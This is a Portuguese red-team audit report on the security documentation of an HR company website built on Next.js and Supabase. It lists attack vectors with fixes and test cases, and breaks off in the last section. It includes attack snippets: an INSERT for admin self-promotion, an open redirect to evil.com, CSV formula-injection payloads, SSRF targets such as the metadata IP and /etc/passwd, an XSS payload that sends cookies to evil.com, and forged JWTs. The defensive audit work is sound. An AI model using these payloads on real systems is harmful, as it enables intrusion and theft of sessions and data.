# Relatório de Red Team — Auditoria da Documentação de Segurança (Revisão Documental)

| Campo | Valor |
|---|---|
| **Documento** | AUD-RT-001 |
| **Versão** | 1.1 |
| **Status** | Vigente — revisão documental (sem testes em ambiente real); correções documentais aplicadas pela Equipe de Segurança (§6) |
| **Classificação** | Restrito |
| **Data** | 2026-08-12 |
| **Auditor** | White Hat Hacker / Red Team |
| **Escopo autorizado** | Revisão estática dos documentos de segurança do site Eliora RH (Next.js + Supabase + Vercel/Netlify + Cloudflare + Resend) |
| **Documentos auditados** | `03-seguranca/01-politica-seguranca.md` · `03-seguranca/02-casos-teste-seguranca.md` · `03-seguranca/03-checklist-hardening.md` · `02-arquitetura/03-modelo-dados.md` (contexto adicional: `02-rotas.md`, `01-arquitetura.md`, `04-infraestrutura.md`) |
| **Metodologia** | Análise estática adversarial: leitura dos controles documentados, busca de vetores realistas para a stack (Supabase REST/Auth com anon key exposta, RLS mal projetada, tokens de confirmação, cache/CDN, webhooks, exportações LGPD) e checagem de consistência entre documentos |

---

## 1. Resumo Executivo

**Nota geral: B** (cobertura ampla e madura para o estágio, com lacunas críticas na superfície específica do Supabase e em fluxos planejados).

**Veredito do red team:** a documentação é, no geral, acima da média para um site institucional: STRIDE por ativo, OWASP Top 10 completo (85 casos de teste), 92 itens de hardening com gate de release, LGPD bem mapeada (arts. 6º, 16, 18–19, 41, 46, 48), resposta a incidente e disclosure responsável. **Porém**, ela trata o Supabase quase como uma "caixa Postgres" e concentra os testes no perímetro da aplicação (Route Handlers). Como atacante, **eu não atacaria o Route Handler — eu atacaria o Supabase diretamente**, usando a `anon key` que a própria documentação admite expor no bundle, e **burlaria o WAF, o Turnstile e o rate limit da aplicação sem tocar uma única linha do Next.js**. Esse é o principal deslocamento de perspectiva que o relatório aponta.

A auditoria encontrou **15 vetores de ataque** não cobertos ou subcobertos (RT-001 a RT-015). Para o **lançamento da fase 1**, considero **bloqueadores**: RT-001 (verificação de grants/RLS no banco), RT-003 (mass assignment + tamper de status que derrota o TTL de retenção LGPD), RT-006 (cache/CDN), RT-008 (exportação LGPD insegura), RT-010 (abuso do formulário para phishing interno + esgotamento de quota do Resend), RT-012 (PII/IP em logs de terceiros e token em query string) e RT-015 (rate limit distribuído/custo). As fases 2 (auth/admin) e 3 (portal/CRM) acumulam riscos **críticos** que precisam ser tratados **antes** do desenvolvimento, não depois (RT-002, RT-004, RT-005).

Há ainda **2 inconsistências entre documentos** que, sozinhas, derrubariam controles inteiros: (1) a tabela de **registro de consentimento** exigida por ST-077/078 e HC-077 **não existe** no modelo de dados; (2) a política RLS `admin_self` de `usuarios_admin`, como escrita, **permite auto-promoção a admin** (contraria a nota "é impossível" do próprio documento). Detalhes nas seções 2.4 e 3.

---

## 2. Análise por Categoria

### 2.1 `01-politica-seguranca.md` — Política de Segurança

**Pontos fortes**
- Modelo STRIDE aplicado a ativos nomeados com níveis de sensibilidade e perfis de atacante — raro e bem executado.
- Princípios com diretriz prática por item (P-01 a P-10), incluindo default-deny e defense in depth.
- LGPD aplicada com citação de artigos corretos (6º, 16, 18–19, 41, 46, 48) e prazos de notificação coerentes.
- Seção de incidentes com tempos-alvo e conteúdo do art. 48; disclosure responsável com `security.txt` e safe harbor.
- Cadeia de suprimentos e segregação de secrets já previstos.

**Lacunas**
- **Ameaça "Spoofing" não detalha OAuth/magic link** (fase 2): a mitigação cita MFA, mas não há controle documentado para `redirect_uri` aberto, PKCE, `redirect_to` e open redirect — vetor clássico de account takeover no Supabase Auth (ver RT-004).
- **DoS tratado só no nível de volume**, sem contemplar *cost/billing abuse* (exaustão da quota do Resend em plano free e pico de conexões serverless no pool do Supabase) — ver RT-010/RT-015.
- **Fluxos de PII para processadores invisíveis:** Sentry recebe URL/breadcrumbs (inclusive tokens de query string); Vercel/Netlify/Cloudflare logam IP real; o documento afirma "IP apenas como hash" sem considerar esses fluxos — ver RT-012.
- **Política não prevê reavaliação periódica do modelo de ameaças** quando as fases 2/3 forem implementadas.

### 2.2 `02-casos-teste-seguranca.md` — 85 casos de teste

**Pontos fortes**
- Cobertura integral do OWASP Top 10 + categorias transversais + LGPD; severidade com escala CVSS.
- Testes com passos, resultado esperado e severidade — acionáveis.
- Rotina de execução (curl/navegador/Burp) e automação em CI (Semgrep, gitleaks, ZAP, testssl, Trivy) com gate de release.

**Lacunas (o que falta como caso de teste)**
- **Nenhum teste ataca o Supabase diretamente:** não há caso para chamar `https://<ref>.supabase.co/rest/v1/...` e `/auth/v1/...` com a `anon key` extraída do bundle, burlando WAF/Turnstile/rate-limit da aplicação (ver RT-001).
- **Nenhum teste negativo de RLS executado como role `anon`/`authenticated`** no banco (ex.: `SET ROLE anon; SELECT * FROM contato_mensagens;`). ST-056 verifica RLS *habilitada*, mas não testa as *políticas* e *grants* — onde vive o risco real.
- **Tokens de confirmação da newsletter:** não há caso para replay após uso, expiração, brute force de token de baixa entropia, nem vazamento do token via Referer/logs/Sentry por estar em query string (ver RT-003). ST-076 cobre reset de senha, não confirmação de newsletter.
- **Fase 2 (auth/admin) sem casos:** OAuth redirect_uri, login CSRF, brute force contra o endpoint de auth do Supabase (fora do Cloudflare), magic link bombing, JWT/sessão forjado (ver RT-004, RT-005, RT-011).
- **Exportação LGPD sem casos de injeção:** ST-079 valida o formato do JSON/CSV, mas não testa **CSV/Formula injection**, path traversal no nome do arquivo, expiração/escopo do link de download (ver RT-008).
- **Cache:** ST-065 cobre Web Cache Deception, mas não cache poisoning via headers (`x-rewrite-url`, `X-Forwarded-Host`), `stale-while-revalidate`, nem `Vary` ausente (ver RT-006).
- **Webhook do CRM (fase 3)** sem casos de replay, assinatura em tempo constante, injeção de contatos falsos (ver RT-007).
- **XSS em Markdown** não coberto (o blog armazena `conteudo` em Markdown; ST-019 testa HTML genérico) (ver RT-013).

### 2.3 `03-checklist-hardening.md` — 92 itens

**Pontos fortes**
- Priorização CRÍTICO/ALTO/MÉDIO/BAIXO com "como verificar" e ferramenta por item — excelente gate de pré-release.
- Cobre app, edge, banco, dependências, LGPD e governança; itens de retenção/consentimento concretos.

**Lacunas**
- **HC-054/055 verificam RLS habilitada, mas nenhum item verifica grants das roles** (`\dp` / `information_schema`) e **nenhum item verifica o escopo `FOR` das políticas** (`FOR ALL` vs `FOR SELECT`) — exatamente o bug que permite auto-promoção a admin (ver RT-002).
- **Sem item de segurança do Supabase Auth:** rate limit nativo, CAPTCHA/Turnstile no auth, desabilitar signup público, allowlist de `redirect_uri` e `redirect_to` — configs do dashboard que o checklist ignora (ver RT-004/RT-005).
- **Sem item para cache key/poisoning** no Cloudflare/Vercel (headers de rewrite, `Cache-Control` em rotas autenticadas) (ver RT-006).
- **Sem item para tokens de confirmação** (invalidação pós-uso, expiração, proibição de token em query string) (ver RT-003).
- **Sem item para links de download/exportação LGPD** (URLs com capacidade, expiração, `Content-Disposition`) (ver RT-008).
- **Sem item para CNAMEs órfãos / subdomain takeover** e sem verificação de que logs de terceiros (Sentry/Vercel/Cloudflare) não recebem PII (ver RT-012/RT-014).

### 2.4 `02-arquitetura/03-modelo-dados.md` — Schema e RLS

**Pontos fortes**
- RLS em todas as tabelas com default-deny (`USING (false)`), sem coluna de senha, token de confirmação hasheado, `ip_hash` HMAC com pepper, TTL via `pg_cron`, mapeamento LGPD por tabela e diagrama Mermaid.

**Lacunas (inclui 2 achados críticos de consistência)**
- ⚠️ **ACHADO A1 (inconsistência grave):** a tabela de **registro de consentimento** exigida por ST-077/078 (`consent_version`, `consented_at`, `ip_hash`, `form_origin`, append-only) e por HC-057/HC-077 **não existe no modelo de dados**. `contato_mensagens` tem só um `boolean consentimento_lgpd`; `newsletter_assinantes` não tem campos de consentimento nem `ip_hash`. Ou seja: os casos de teste e o checklist de release **não são executáveis** contra o schema documentado. Sem registro de consentimento rastreável, a base legal do art. 7º, I fica fragilizada numa auditoria da ANPD.
- ⚠️ **ACHADO A2 (vulnerabilidade no design RLS):** a política `admin_self` de `usuarios_admin` é escrita sem cláusula `FOR`, então `CREATE POLICY` assume **`FOR ALL`**. Isso inclui **INSERT**: um usuário autenticado (signup público do Supabase) pode inserir a própria linha em `usuarios_admin` com `ativo=true` e **promover-se a admin** — contradizendo a nota do documento ("promoção a admin é impossível"). Detalhe e POC no RT-002.
- **`blog_categorias`:** a "SELECT pública" precisa ser implementada com `USING (true)` apenas em nome/slug — o documento não mostra a policy; risco de vazamento se a policy for escrita com `FOR ALL` e houver grant de escrita para `authenticated`.
- **`contatos_crm.payload` (jsonb):** espelha PII e é gravado sem validação de conteúdo/schema; se o webhook de entrada for abusado, o `payload` vira vetor de armazenamento de dados arbitrários (ver RT-007).
- **`service_role` como acesso exclusivo da aplicação** é um ponto único de comprometimento: se a chave vazar, RLS é inútil (ela ignora políticas). O modelo não prevê um **role Postgres próprio da aplicação com grants mínimos** no lugar do `service_role` global.

---

## 3. Vetores de Ataque Não Cobertos ou Subcobertos

> Legenda de severidade: **Crítico** (comprometimento/PII em massa), **Alto** (explorável com impacto relevante), **Médio** (degradação postura/abuso limitado). Cada vetor traz o cenário que um atacante tentaria, por que a documentação atual falha, e a correção/caso de teste concreto.

---

### RT-001 — Bypass total do WAF/Turnstile/rate-limit via REST API do Supabase com a `anon key` do bundle

**Cenário de ataque.** Eu extraio a `SUPABASE_ANON_KEY` e o `SUPABASE_URL` do bundle JS (`_next/static/*.js`) e passo a chamar `https://<ref>.supabase.co/rest/v1/...` diretamente, sem passar pelo site. Toda a camada anti-spam da aplicação (honeypot, Turnstile, rate limit do Route Handler) **é ignorada**. Se qualquer tabela tiver uma política RLS permissiva ou grant mal revogado, eu leio/escrevo nela em volume (ex.: `?select=*`, `limit=100000`, `order=...`), faço enumeration de colunas via `?select=nome,email,telefone` e até testo o OpenAPI do PostgREST (`/rest/v1/`) para mapear o schema.

**Por que a doc atual falha.** Os 85 casos de teste atacam rotas do Next.js. Nenhum caso testa o Supabase como *endpoint público de fato* (que é: a `anon key` é um JWT de acesso e o PostgREST é acessível). HC-040 previne a exposição da `service_role`, mas o risco aqui é a `anon key` (que a própria infra doc diz "pode ser exposta ao client **somente com RLS forte**") — e a força do RLS nunca é verificada em teste negativo.

**Recomendação.** Adicionar caso de teste **ST-086**: com a `anon key` do bundle, executar contra staging: `GET /rest/v1/` (schema OpenAPI), `GET /rest/v1/blog_posts?select=*`, `GET /rest/v1/contato_mensagens`, `POST /rest/v1/contato_mensagens` — todas devem retornar 401/403 por RLS/grants. Adicionar **HC-093**: auditoria trimestral de grants via `SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_schema='public'` + verificação de que nenhuma tabela com PII tem policy pública. Adicionar teste automatizado no CI que roda queries como `anon` e `authenticated` (supabase tests / pgTAP).

---

### RT-002 — Auto-promoção a admin via política RLS `FOR ALL` em `usuarios_admin` (fase 2)

**Cenário de ataque.** O modelo define:

```sql
CREATE POLICY "admin_self"
  ON public.usuarios_admin
  USING (id = auth.uid())
  WITH CHECK (id = auth.uid());
```

Sem cláusula `FOR`, o Postgres assume **`FOR ALL`** — a política vale para SELECT, **INSERT**, UPDATE e DELETE. Como o Supabase aplica default privileges de escrita (`GRANT ALL`) a `anon`/`authenticated` em tabelas novas, qualquer pessoa que criar uma conta no Supabase Auth (signup público) pode:

```sql
INSERT INTO public.usuarios_admin (id, email, nome_exibicao, ativo)
VALUES (auth.uid(), 'attacker@evil.com', 'Hacked', true);
```

e a política `WITH CHECK (id = auth.uid())` **passa**. Pronto: acesso total ao admin. A nota do documento ("promoção a admin é impossível, `ativo` só é alterável via service_role") é **falsa** sob a política como escrita — o `WITH CHECK` não restringe colunas, e o INSERT nem precisa de outra aprovação.

**Por que a doc atual falha.** HC-054/055 verificam RLS habilitada e existência de `WITH CHECK`, mas **não verificam o escopo `FOR` das políticas** nem fazem teste negativo de INSERT/UPDATE por role. ST-003/ST-004 testam RBAC na aplicação, não o banco.

**Recomendação.** Corrigir o modelo: `FOR SELECT` e `FOR UPDATE` separados (com `WITH CHECK (id = auth.uid() AND ativo IS NOT DISTINCT FROM true)` restrito a UPDATE), **sem política de INSERT** (insert só via `service_role`/SQL administrativo), e revogar explicitamente `GRANT INSERT` da role `authenticated` na tabela. Adicionar **ST-087**: como `authenticated`, tentar INSERT/UPDATE/DELETE em `usuarios_admin` → 403. Adicionar **HC-094**: revisão de policies com `pg_policies` listando `cmd` (SELECT/INSERT/UPDATE/DELETE) por tabela — nenhuma tabela com dados sensíveis pode ter `cmd='ALL'` habilitado para role não-privilegiada.

---

### RT-003 — Mass assignment e tamper de colunas que derrota o TTL de retenção LGPD

**Cenário de ataque.** No `POST /api/contato`, eu intercepto no Burp e adiciono campos que o zod **pode não ter em allowlist** se a schema não for `.strict()`: `"status": "em_andamento"`, `"criado_em": "2099-01-01"`, ou `"id"`. Se o Route Handler passa o body validado direto para o `supabase.insert(payload)`, eu consigo: (a) marcar minha mensagem como `em_andamento` → o job de TTL **pula** (condição `status <> 'em_andamento'`) → meu dado (e PII) permanece **além dos 90 dias**, violando retenção/anonimização LGPD; (b) definir `criado_em` futuro → nunca entra na janela de exclusão; (c) com `status='respondido'`, esconder do funil de triagem do admin.

**Por que a doc atual falha.** ST-052 testa mass assignment com campos `role/admin/is_verified`, mas **não testa a interação com o job de retenção** nem a possibilidade de inserir `status`/`criado_em` — o vetor não é escalada, é **integridade de dados + falha de conformidade LGPD**. O modelo de dados permite: `criado_em` é `NOT NULL DEFAULT now()` (mas nada impede o cliente de mandar valor), e `status` é coluna normal.

**Recomendação.** Server-side: usar `.strict()` no zod, `pick()` apenas dos campos permitidos, e **nunca** inserir a partir do body direto — montar o objeto de INSERT com `status` e `criado_em` definidos pelo servidor. Adicionar **ST-088**: enviar POST com `status`, `criado_em`, `id`, `ip_hash` → verificar que o banco ignora/sobrescreve (assert no banco). Adicionar **HC-095**: teste que simula TTL vencido com mensagem `em_andamento` e verifica que o job a exclui mesmo assim (ou que há alerta para revisão manual em tempo finito).

---

### RT-004 — Account takeover via OAuth/magic link com `redirect_uri`/`redirect_to` aberto (fase 2)

**Cenário de ataque.** O admin entra por magic link/OAuth (documentado em `02-rotas.md`). Se o `redirect_to`/`redirect_uri` não tiver allowlist estrita, eu monto um link:

```
https://www.eliora-rh.com.br/auth/callback?redirect_to=https://evil.com/
```

O Supabase Auth (GoTrue) anexa o **código/token da sessão** ao `redirect_to` após o login. A vítima (um admin legítimo) clica no meu link, faz login, e **o token de sessão cai no meu domínio**. Também exploro: `redirect_uri` com wildcard no painel do Supabase, open redirect na rota `/auth/callback` (que redireciona usuário logado para `evil.com` → phishing), e magic link sem expiração/PKCE.

**Por que a doc atual falha.** A política de segurança (§2.5 Spoofing) cita MFA e "sessão server-side", mas **nenhum caso de teste cobre OAuth**: sem ST para redirect_uri, `redirect_to`, PKCE, binding de código a `code_verifier`, ou reuso de código de autorização. ST-043/ST-049 cobrem fixação/expiração de sessão genérica, não o fluxo OAuth do Supabase.

**Recomendação.** Antes de implementar a fase 2: documentar no Supabase o `Site URL` + allowlist exata de Redirect URLs (**sem wildcards**), validar `redirect_to` server-side contra allowlist (nunca ecoar o valor da query), usar PKCE obrigatório no fluxo PKCE/OAuth do GoTrue. Adicionar **ST-089**: login com `redirect_to=https://evil.com` e com `redirect_uri=https://evil.com` → token **nunca** redirecionado para origem não autorizada (verificar em staging via proxy). Adicionar item **HC-096**: auditoria das Redirect URLs do projeto Supabase.

---

### RT-005 — Brute force, credential stuffing e email bombing direto no Supabase Auth (fase 2)

**Cenário de ataque.** O endpoint de login é `https://<ref>.supabase.co/auth/v1/token?grant_type=password` — **fora do domínio do site e fora do Cloudflare**. O rate limit da aplicação (HC-027) protege a rota do Next.js, não este endpoint. Com a `anon key` do bundle eu disparo:
- **Credential stuffing**: 10k senhas de listas vazadas contra o e-mail de um admin, rotacionando IPs (proxies/residenciais) para contornar o rate limit IP-based do GoTrue.
- **Magic link / OTP bombing**: `POST /auth/v1/magiclink` em loop contra o e-mail da vítima → caixa de e-mail inundada + consumo da quota de e-mails (impacto operacional e reputacional).
- **Enumeração**: respostas/timing do `signup` e `token?grant_type=password` (usuário existe vs não existe).

**Por que a doc atual falha.** HC-027 e ST-045 assumem que o login passa pelo Cloudflare/app; o Supabase Auth é **alcançável diretamente** e os controles documentados não se aplicam. Nenhum caso de teste considera o endpoint `/auth/v1/*`.

**Recomendação.** Definir, **antes** da fase 2: (a) **desabilitar signup público** (criação de conta só via convite/admin); (b) allowlist de domínios de e-mail; (c) CAPTCHA/Turnstile no próprio fluxo do Supabase Auth (suportado nativamente); (d) alerta de anomalia para `auth/v1` com falhas em série; (e) rate limit adicional em um proxy/edge function que medeia o login (em vez de expor `/auth/v1` direto ao browser). Adicionar **ST-090**: brute force direto em `/auth/v1/token` (staging) verificando lockout do GoTrue + **ST-091**: magiclink bombing com N requisições → limite de rate do provedor + alerta disparado.

---

### RT-006 — Cache poisoning / Web Cache Deception / `stale-while-revalidate` no CDN (fase 1 e 2)

**Cenário de ataque.** A infra doc prevê `s-maxage=60, stale-while-revalidate=600` para HTML de ISR. Eu exploro:
- **Cache poisoning via header não-chaveado**: injeto `X-Forwarded-Host: evil.com` (ou `x-rewrite-url`, `X-Original-URL`) e, se o middleware/edge montar URLs a partir desses headers e a cache key não incluir `Host`, consigo envenenar a resposta canônica (ex.: CSP/canonical/OG apontando para `evil.com` → SEO poisoning + phishing em massa para todo visitante).
- **Web Cache Deception em rota autenticada (fase 2/3)**: `/admin/mensagens/xyz/nao-existe.css` — se o CDN cacheador basear a cache no sufixo `.css` e o origin responder o conteúdo sensível com 200, o conteúdo do admin vaza para o cache público.
- **Vary ausente em `/api/blog`** → resposta de um usuário (cookie) servida a outro se a rota receber `Cache-Control` público indevido.

**Por que a doc atual falha.** ST-065 cobre Web Cache Deception apenas com `/perfil/nonexist.css` e não testa poisoning por headers, ISR/SWR, nem cache key por host. HC não tem item para cache key no Cloudflare/Vercel nem `Cache-Control` em rotas autenticadas.

**Recomendação.** Documentar e testar: cache key = `Host + path` (ignorar headers de forwarding não confiáveis no edge), rotas autenticadas com `Cache-Control: private, no-store` (verificável por teste), `Vary: Cookie`/`Authorization` onde aplicável, e **ST-092**: teste de poisoning com `X-Forwarded-Host`/`x-rewrite-url` em staging (verificar que canonical/CSP/OG não refletem o header injetado) + extensão do ST-065 para rotas `/admin/*`.

---

### RT-007 — Abuso do webhook do CRM: injeção de contatos falsos, replay e SSRF (fase 3)

**Cenário de ataque.** O endpoint `POST /api/webhook/crm` (rotas doc) recebe contatos com "segredo compartilhado". Eu ataco por três frentes:
1. **Injeção de dados falsos no CRM**: se a verificação de assinatura for fraca (ou o segredo estiver em header previsível/query string logada), eu forjo eventos de "novo contato" e **enveneno o CRM da empresa** com PII falsa (impacto de integridade de negócio + volume).
2. **Replay**: capturo um evento legítimo e reenvio N vezes → duplicatas no CRM, sem idempotency.
3. **SSRF**: se a URL de destino do CRM (ou de qualquer enriquecimento de link/preview) for configurável via payload, tento `http://169.254.169.254/latest/meta-data/`, `http://127.0.0.1:5432/`, `file:///etc/passwd`.

**Por que a doc atual falha.** ST-059/060 cobrem SSRF genérico, mas **não existem casos para o webhook de entrada do CRM**: assinatura em tempo constante, replay/idempotência, validação de schema do payload, e restrição de que o destino do webhook seja URL fixa em env var (nunca derivada de input).

**Recomendação.** Documentar: comparação HMAC com `crypto.timingSafeEqual`, idempotency key por evento (coluna `origem_id`/hash do payload), schema zod estrito do payload, e **ST-093**: replay de evento (mesma assinatura) → rejeitado; payload com `{"url": "http://169.254.169.254/..."}` em qualquer campo → rejeitado; **ST-094**: assinatura inválida/token vazado em query string → 401 e segredo **nunca** aceito via query param.

---

### RT-008 — Exportação/portabilidade LGPD insegura: CSV injection, path traversal e link de download sem escopo

**Cenário de ataque.** O fluxo de portabilidade (ST-079) exporta JSON/CSV por e-mail. Eu ataco:
- **CSV/Formula injection**: cadastro no formulário com `empresa = "=HYPERLINK(\"http://evil.com\",\"Clique aqui\")"`. Quando o admin abre a exportação no Excel, a fórmula **executa** na máquina da Eliora (roubo de credenciais, download de payload, vazamento de planilha interna). Mesma classe: `+cmd|'/C calc'!A0`, `@SUM`.
- **Link de download sem escopo/expiração**: se o download for via URL de capacidade com token longevo ou no próprio `Content-Disposition` com nome derivado do e-mail (que aceita caracteres de caminho), testo `../../../`, `..%2f`, e reuso do link após expirar.
- **Gatilho de export sem autenticação**: chamada direta ao endpoint de export para e-mail arbitrário → **ferramenta de enumeração** (se a resposta diferencia e-mail existente) ou spool de e-mails para terceiros (quota + assédio).

**Por que a doc atual falha.** ST-079 verifica formato/entrega, mas **não há caso de injeção de fórmula, path traversal, expiração de link nem autorização do gatilho**. ST-083 testa identidade, mas não o artefato entregue.

**Recomendação.** Sanitizar células de CSV (prefixo `'` ou gerar XLSX com tipo texto), arquivo com nome fixo gerado no servidor (`export-lgpd-<uuid>.csv`), download com URL assinada/expiração curta + idempotência, e **ST-095**: exportar dados contendo payloads `=HYPERLINK(...)`, `../../etc/passwd` e `..%2f` → arquivo inerte, nome controlado, link expira; **ST-096**: gatilho de export sem autenticação → 401/403 e e-mail não enviado.

---

### RT-009 — Enumeração de assinantes/estados e brute force de token de confirmação na newsletter

**Cenário de ataque.** Exploro os fluxos da newsletter:
- **Token de confirmação de baixa entropia**: se `token_confirmacao` não for CSPRNG de ≥ 128 bits (ex.: 6 dígitos ou slug curto), eu faço brute force no `GET /newsletter?token=...` (que não tem rate limit documentado) até confirmar um e-mail pendente.
- **Enumeração de estado**: diferenças de resposta/código/timing entre token válido-não-usado, token válido-já-usado e token inválido revelam se um e-mail tem assinatura ativa; o `POST /api/newsletter` retorna o mesmo `202`, mas o **e-mail disparado** (ou não) é observável por quem controla a caixa.
- **Replay**: um token capturado (via log/Referer) **continua funcionando** se o handler não invalidar após o uso.

**Por que a doc atual falha.** O modelo de dados hasheia o token (bom), mas **nenhum caso de teste cobre entropia, expiração, invalidação pós-uso, rate limit no endpoint de confirmação nem a colocação do token em query string** (que vaza por Referer/logs/Sentry — ver RT-012). ST-028 trata "reenvio de confirmação em loop" de forma genérica.

**Recomendação.** Especificar: token = 32 bytes aleatórios (ou slug CSPRNG), expiração de 48h, **invalidação após consumo** (coluna `confirmado_em`/token nulo), rate limit no endpoint de confirmação por IP, respostas uniformes, e **ST-097**: reutilizar token já consumido → rejeitado; token expirado → rejeitado; brute force de 1M tentativas com token de 32 bytes → infrutífero e/ou 429.

---

### RT-010 — Form abuse para phishing interno + exaustão de quota do Resend (billing/availability DoS)

**Cenário de ataque.** O formulário dispara **e-mail de notificação ao time da Eliora** a cada submissão. Eu:
1. **Phishing interno**: submeto dezenas de mensagens com texto socialmente plausível e link malicioso ("Preciso de proposta urgente, anexo em https://evil.com/..."). O time da Eliora é treinado a abrir pedidos de contato — **clico e caem**. A doc cobre phishing *via site*, mas não *contra o próprio time*.
2. **Header/content injection na notificação**: se o `from`/`reply-to` da notificação for montado com dados do formulário (ou o assunto/corpo ecoar a mensagem), injeto `\r\nBcc:` (coberto por ST-020 no corpo, mas não no `from`/`reply-to` do Resend).
3. **Quota/billing DoS**: com rotação de IP + Turnstile resolvido por farm, 3.001+ submissões esgotam a quota mensal grátis do Resend (3k e-mails) → **e-mails legítimos de contato e double opt-in passam a falhar** — indisponibilidade de canal de negócio causada por atacante.

**Por que a doc atual falha.** ST-062 mede "taxa de spam < 1%" mas não o **volume agregado vs quota de e-mail**. ST-071 cobre relaying, não o uso do formulário como vetor de phishing ao time nem o custo. Não há alerta de "pico de submissões → quota crítica".

**Recomendação.** Notificação com `from`/`reply-to` fixos, corpo como texto puro sem eco de conteúdo HTML, aviso visual de "conteúdo não confiável" para o time, **limite global diário de notificações** (circuit breaker) independente do rate por IP, monitoramento de quota do Resend com alerta a 80%, e **ST-098**: disparo de volume suficiente para simular esgotamento (staging, quota de teste) → circuit breaker ativo e alerta disparado; payload com `\r\n` no e-mail/empresa refletido em `reply-to` → rejeitado.

---

### RT-011 — Verificação manual de sessão/JWT do Supabase no middleware: `alg` confusion e claims não validados (fase 2)

**Cenário de ataque.** O plano é proteger `/admin/*` com verificação de sessão em Server Components/middleware. Se a implementação validar o JWT "na mão" (ex.: `jsonwebtoken` com `algorithms` não restrito, ou `jose` sem verificação de `aud`/`iss`), eu:
- **Forjo token com `alg: none`** (ou HS256 assinado com a `anon key` pública que está no bundle, no clássico RS/HS confusion) com `sub: <admin_uid>` e `role: authenticated`.
- **Reuso de token antigo**: sem validação de `exp`/revisão de sessão revogada, um token de sessão vazado continua válido após logout.

**Por que a doc atual falha.** Não há caso de teste de **cryptografia do token**: ST-044 mede entropia, mas não testa aceitar JWT forjado/`alg: none`/claims errados. O modelo de dados assume Supabase Auth como caixa preta — mas o middleware de proteção é código **nosso**.

**Recomendação.** Regra de engenharia: usar exclusivamente o SDK oficial `@supabase/ssr` (`createServerClient`) e **nunca** validar JWT manualmente; se houver necessidade (edge middleware), usar `jose` com `algorithms: ['HS256']` explícito, verificação de `aud`/`iss`/`exp`/`sub` e assinatura com `SUPABASE_JWT_SECRET`. Adicionar **ST-099**: enviar JWT com `alg: none`, JWT HS256 assinado com a anon key, e token com `exp` vencido para `/api/admin/*` → todos rejeitados (401).

---

### RT-012 — PII e tokens em logs de terceiros: IP real e token de confirmação em query string

**Cenário de ataque.** Não é só a app: eu exploro **vazamento via telemetria**:
- **Token de confirmação em query string** (`/newsletter?token=...`): aparece no **Referer** de qualquer requisição seguinte (analytics/CTAs), em **breadcrumbs/URLs do Sentry**, e em logs do Cloudflare/Vercel. Se qualquer um desses logs vazar (conta comprometida, export), **tokens são recuperáveis** e a confirmação pode ser reutilizada.
- **IP real em logs de plataforma**: HC-070 afirma "logs sem PII", mas Vercel/Netlify e Cloudflare registram o **IP real do visitante** por padrão (LGPD: dado pessoal). A política afirma "IP apenas como hash" — **falso ao nível de infra**; o fluxo de PII para processadores (Sentry, Vercel, Cloudflare) não está documentado no registro de tratamento.
- **Supabase query logs (Logflare)**: contêm os e-mails pesquisados/gravados.

**Por que a doc atual falha.** ST-056 testa logs da *aplicação*, não logs dos provedores. HC-070/ST-056 não cobrem query strings em breadcrumbs do Sentry nem IPs em access logs de CDN. A contradição com a promessa "IP só hash" tem impacto LGPD (base legal e DPAs).

**Recomendação.** (a) Mover o token de confirmação para **corpo de requisição** (POST) ou usar **token em fragmento (`#token`)** que não trafega para o servidor — ou aceitar e mitigar, mas documentar; (b) configurar redação no Sentry (scrub de `token`, `email`, query strings) e desabilitar coleta de PII em breadcrumbs; (c) documentar os processadores que recebem IP (Vercel/Cloudflare/Sentry) no registro de tratamento e citar nas DPAs; (d) **ST-100**: enviar confirmação com `token` na URL e verificar no Sentry/analytics/Referer que o token não é capturado (ou que a página envia `Referrer-Policy: no-referrer`). Adicionar **HC-097**: auditoria de acesso a logs das plataformas (quem pode ver IP/tokens).

---

### RT-013 — Stored XSS via Markdown/HTML no blog e comentários (fase 2)

**Cenário de ataque.** `blog_posts.conteudo` é Markdown renderizado (documentado). Se a renderização usar `react-markdown` + `rehype-raw` (para suportar HTML) **sem sanitização** (ex.: `rehype-sanitize`), eu (como autor comprometido, ou via CMS externo, ou via payload em `autor`):
- Insiro `<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">` no Markdown → **XSS armazenado** para todos os visitantes do post (ROI: phishing/SEO/sessões, se algum cookie não for HttpOnly).
- `[clique aqui](javascript:alert(1))` em links Markdown, `![alt](x" onerror="...)`, e HTML bruto em `autor`/`resumo`.

**Por que a doc atual falha.** ST-019 testa HTML genérico renderizado, mas **nenhum caso cobre sanitização de Markdown** (rehype-raw, `javascript:` URLs, atributos em imagens/links). O modelo de dados não documenta o pipeline de renderização do `conteudo`.

**Recomendação.** Documentar: renderização de Markdown **sem** `rehype-raw` (ou com `rehype-sanitize` + allowlist estrita), URLs com scheme allowlist (`http/https/mailto`), e **ST-101**: post de teste em staging com `<img onerror>`, `javascript:` links, `">` escape → renderizado como texto inerte; resposta da API `/api/blog/[slug]` nunca devolve HTML executável.

---

### RT-014 — Subdomain takeover (CNAMEs órfãos) + inconsistência de domínio entre documentos

**Cenário de ataque.** Os docs de teste usam `staging.eliora.com.br` e a infra usa `eliora-rh.com.br`. Se o CNAME de staging/preview apontar para um projeto Vercel/Netlify que for **deletado**, o subdomínio fica "órfão" e eu posso **reivindicá-lo na plataforma** (subdomain takeover): controle total do host → phishing contra clientes/recrutados, roubo de cookies de domínio pai (se houver cookie sem `__Host-`), SEO poisoning. Também exploro: `preview-*.vercel.app` vazando ambientes de staging (que podem conter dados de teste reais), e **DNS rebinding** contra o futuro portal do cliente caso alguma lógica valide hostname de forma inconstante (duas respostas de resolução).

**Por que a doc atual falha.** HC-032 verifica proxy laranja, mas **nenhum item testa CNAMEs órfãos**, registros DNS pendentes de subdomínios, nem a consistência canônica. O conflito `eliora.com.br` × `eliora-rh.com.br` entre documentos é em si um risco: um domínio pode ser configurado errado em produção e o outro (sem controles) pode ser registrado por terceiro (typosquatting).

**Recomendação.** Inventário de DNS com verificação de que todo CNAME custom tem destino **vivo** (cron job); política de deletar registros DNS ao desprovisionar ambientes; padronizar **um único domínio canônico** em todos os documentos; **ST-102**: enumerar subdomínios (`crt.sh`, wordlist) e testar cada CNAME órfão para takeover (staging); **HC-098**: verificação periódica de dangling CNAMEs (ex.: `dnsreaper`/script próprio) + DNSSEC confirmado no registro.

---

### RT-015 — Rate limit distribuído/global ausente, honeypot sem telemetria e DoS de custo

**Cenário de ataque.** Os controles são por IP e por e-mail. Eu:
- **Distribuo** o ataque por botnet/proxies residenciais (centenas de IPs) → cada IP fica abaixo do limite (5–10/h) e o **volume agregado** passa: banco cheio de lixo, Resend esgotado (ver RT-010), time inundado.
